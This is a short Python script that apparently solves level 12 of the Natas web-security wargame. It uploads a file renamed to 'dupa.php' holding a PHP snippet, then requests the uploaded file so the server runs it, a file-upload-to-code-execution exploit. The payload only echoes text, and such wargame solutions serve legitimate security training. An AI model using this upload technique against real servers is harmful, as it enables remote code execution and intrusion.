from natas import Natas
import io


natas = Natas('natas12')

f = io.BytesIO(b'<?php echo "dupa";')  # execute any script on the server

post = {'filename': 'dupa.php'}
files = {'uploadedfile': f}

resp = natas.get_response(data=post, files=files)

href = resp.a.get('href')

resp = natas.get_response(relative_url=href)

print(resp)
